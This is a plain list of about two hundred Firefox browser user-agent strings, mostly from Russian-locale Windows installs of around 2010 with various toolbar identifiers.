Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03790) Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 (.NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.0.1.41
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101209 Fedora/3.6.13-1.fc13 Firefox/3.6.13
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.22pre) Gecko/20090327 Ubuntu/7.10 (gutsy) Firefox/2.0.0.22pre
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTF/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03396) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.15) Gecko/20101026 BTRS28059 Firefox/3.5.15 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03790) Firefox/3.6.12 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03637) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 AskTbNRO2/3.13.2.19379 Firefox/3.6.25 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03790) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.3.31
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03392) Firefox/3.5.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.0) Gecko/20100101 Firefox/27.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.12) Gecko/20101026 SUSE/3.6.12-0.7.1 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03796) Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03755) Firefox/3.6.12 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03270) Firefox/3.5.16 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 GTB7.1 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.3.0.102 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03755) Firefox/3.6.13 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03397) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03796) Firefox/3.6.8 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101122 Firefox/3.5.16 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03796) Firefox/3.6.10 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.3 (build 02564) AskTbFXTV5/3.9.1.14019 Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 AskTbALSV5/3.15.25.44892 Firefox/3.6.28
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03796) Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03403) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03790) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AskTbARS/3.9.1.14019 Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03757) Firefox/3.5.16 sputnik 2.3.0.96
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:151.43.169.50]
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AskTbCPUID/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03757) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AdCentriaIM/1.7 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03270) Firefox/3.6.12 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03658) Firefox/3.6.13 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03278) Firefox/3.5.11 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03639) Firefox/3.6.13 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03791) AskTbASV5/3.9.1.14019 Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) AskTbFF/3.9.1.14019 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20101231 Firefox/4.0b9pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14 (.NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.2.0.35
Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110101 Firefox/4.0b9pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.5 (build 02842) Firefox/3.5.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) AskTbPTV2/3.9.1.14019 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03402) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110104 Firefox/4.0b9pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 AskTbPF/3.9.1.14019 Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTbFXTV5/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbAVR-3/3.15.26.45268 Firefox/3.6.13
Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110106 Firefox/4.0b9pre
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02780) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03796) Firefox/3.0.19 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.7 (build 03790) Firefox/2.0.0.20 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.2) Gecko/2008082714 Firefox/3.0.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20121030 Firefox/16.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0 AlexaToolbar/alxf-2.19
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 BTRS26731 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03797) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) AskTbPTV/3.9.1.14019 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03270) Firefox/3.6.13 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03658) Firefox/3.6.6 ( .NET CLR 3.5.30729) sputnik 2.3.0.74 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.3 (build 02564) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbTRL2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02842) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20110104 Fedora/3.6.13-1.fc14 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03649) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03686) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03658) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.5 (build 02790) Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03396) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03672) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AdCentriaIM/1.7 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03755) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.3 (build 02560) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbSPC2/3.9.1.14019 Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV5/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 AskTbVD/3.9.1.14019 Firefox/3.5.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.5 (build 02842) Firefox/3.5.16 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03796) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03403) Firefox/3.5.16 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 DefView Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows NT 5.1; rv:2.0b10pre) Gecko/20110120 Firefox/4.0b10pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.0.1.41
Mozilla/5.0 (Windows NT 5.1; rv:2.0b4) Gecko/20100818 MRA 5.7 (build 03796) Firefox/4.0b4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.4 (build 02647) Firefox/3.5.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 AskTbPTV2/3.9.1.14019 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.4 (build 02647) Firefox/3.5.16 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03789) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03402) Firefox/3.5.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 GTB7.1 sputnik 2.4.0.32
